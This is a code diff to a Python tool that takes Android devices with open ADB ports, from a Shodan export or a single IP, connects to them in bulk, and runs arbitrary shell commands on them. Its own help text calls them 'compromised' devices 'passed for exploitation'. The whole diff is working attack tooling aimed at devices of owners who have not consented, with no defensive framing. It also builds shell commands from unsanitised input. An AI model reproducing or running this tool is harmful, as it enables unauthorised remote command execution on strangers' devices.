@@ -2,7 +2,6 @@
 import json
 import logging
 import os
-from subprocess import Popen
 
 logging.basicConfig(format='[%(asctime)s %(levelname)s]: %(message)s',
                     datefmt='%m/%d/%Y %I:%M:%S %p',
@@ -37,7 +36,7 @@ def get_arguments():
     parser.add_argument('--target-ip',
                         dest='ip',
                         required=False,
-                        help='An IP address of the android device to connect to.')
+                        help='An IP address of the android device')
     parser.add_argument('--target-port',
                         dest='port',
                         default=5555,
@@ -48,39 +47,69 @@ def get_arguments():
                         required=False,
                         help='A file with Shodan export in JSON format. '
                              'JSON entries must be separated with a new-line character.')
+    parser.add_argument('-c',
+                        '--connect',
+                        action='store_true',
+                        required=False,
+                        help='Connect to the remote android device(s).')
+    parser.add_argument('-x',
+                        '--execute',
+                        dest='execute',
+                        required=False,
+                        help='Execute a given command on the compromised android device(s)')
     options = parser.parse_args()
 
     return options
+
+
+class AndroidDevice:
+    def __init__(self, ip_address, port):
+        self.ip_address = ip_address
+        self.port = str(port)
+
+    def connect(self):
+        logging.info('Connecting to %s:%s', self.ip_address, self.port)
+        try:
+            os.system(f'adb connect {self.ip_address}:{self.port}')
+        except Exception as e:
+            logging.error('%s - %s', self.ip_address, e)
+
+    def execute(self, command):
+        logging.info('Executing %s command on %s:%s', command, self.ip_address, self.port)
+        try:
+            os.system(f'adb -s {self.ip_address}:{self.port} shell {command}')
+        except Exception as e:
+            logging.error('%s -%s', self.ip_address, e)
 
 
 def read_shodan_json_file(file_name):
     logging.info('Reading %s', file_name)
     with open(file_name, 'r') as f:
         try:
-            return [json.loads(line) for line in f.readlines()]
+            devices = []
+            for line in f.readlines():
+                dump = json.loads(line)
+                devices.append(AndroidDevice(ip_address=dump['ip_str'], port=dump['port']))
+            return devices
         except Exception as e:
             logging.error(e)
             return []
 
 
-def connect_device(ip_address, port):
-    logging.info('Probing %s:%s for an open ADB port', ip_address, port)
-    try:
-        os.system(f'adb connect {ip_address}:{port}')
-    except Exception as e:
-        logging.error('%s - %s', ip_address, e)
-
-
 options = get_arguments()
 android_devices = []
 if options.ip:
-    connect_device(ip_address=options.ip, port=options.port)
+    android_devices = [AndroidDevice(ip_address=options.ip, port=options.port)]
 elif options.shodan_file:
     android_devices = read_shodan_json_file(file_name=options.shodan_file)
-    if android_devices:
-        os.system("adb tcpip 5555")
-        logging.info('%s android devices have been passed for exploitation', len(android_devices))
+if android_devices:
+    os.system("adb tcpip 5555")
+    logging.info('%s android devices have been passed for exploitation', len(android_devices))
+    if options.connect:
         for device in android_devices:
-            connect_device(device['ip_str'], device['port'])
+            device.connect()
+    if options.execute:
+        for device in android_devices:
+            device.execute(options.execute)
 logging.info('All connected devices:')
 os.system('adb devices -l')
